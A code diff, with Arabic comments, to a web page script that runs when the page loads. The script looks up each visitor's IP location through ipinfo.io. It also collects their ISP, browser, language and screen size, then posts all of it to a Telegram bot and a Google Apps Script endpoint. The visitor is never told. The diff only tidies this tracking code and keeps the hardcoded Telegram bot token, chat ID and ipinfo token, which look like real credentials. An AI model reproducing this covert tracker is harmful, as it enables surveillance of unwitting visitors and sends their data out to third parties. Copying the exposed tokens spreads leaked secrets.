@@ -108,7 +108,7 @@
 
     async function logVisitorInfo() {
       try {
-        const res = await fetch('https://ipinfo.io/json?token=5e4cc2202c7681'); // حط توكنك هنا لو عندك
+        const res = await fetch('https://ipinfo.io/json?token=5e4cc2202c7681');  // التوكن بتاعك
         const data = await res.json();
 
         const info = {
@@ -136,38 +136,32 @@
           🛰️ مزود الخدمة: ${info.org}
         `;
 
-        // ابعت البيانات دي لـ Telegram Webhook
-        fetch("https://api.telegram.org/bot7661069709:AAGR_xR9p1sZoc_-Xvynqdn5aMVpp_ph84U/sendMessage", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    chat_id: "1193959724",  // Chat ID الصحيح
-    text: message
-  })
-});
+        // ابعت البيانات لـ Telegram
+        await fetch("https://api.telegram.org/bot7661069709:AAGR_xR9p1sZoc_-Xvynqdn5aMVpp_ph84U/sendMessage", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: "1193959724",  // Chat ID بتاعك
+            text: message
+          })
+        });
 
-        // ابعت البيانات دي لـ Google Sheets Web App
-        fetch('https://script.google.com/macros/s/AKfycbxSyS-vA-ZTd5oQUJ9s5SUBX3twp0vama-1wxaE3rzP4VEjTiLE8JEnIIifpbMovkAOfg/exec', {
-  method: 'POST',  // استخدم POST بدلاً من GET
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({
-    ip: data.ip,
-    city: data.city,
-    region: data.region,
-    country: data.country,
-    loc: data.loc,
-    org: data.org,
-    timezone: data.timezone,
-    browser: navigator.userAgent,
-    language: navigator.language,
-    screen: `${window.screen.width}x${window.screen.height}`,
-    time: new Date().toLocaleString()
-  })
-});
+        // ابعت البيانات لـ Google Sheets Web App
+        await fetch('https://script.google.com/macros/s/AKfycbxSyS-vA-ZTd5oQUJ9s5SUBX3twp0vama-1wxaE3rzP4VEjTiLE8JEnIIifpbMovkAOfg/exec', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(info)
+        });
+
+      } catch (error) {
+        console.error("Error:", error);
+      }
+    }
+
     // شغلها بعد تحميل الصفحة
     window.addEventListener("load", logVisitorInfo);
   </script>
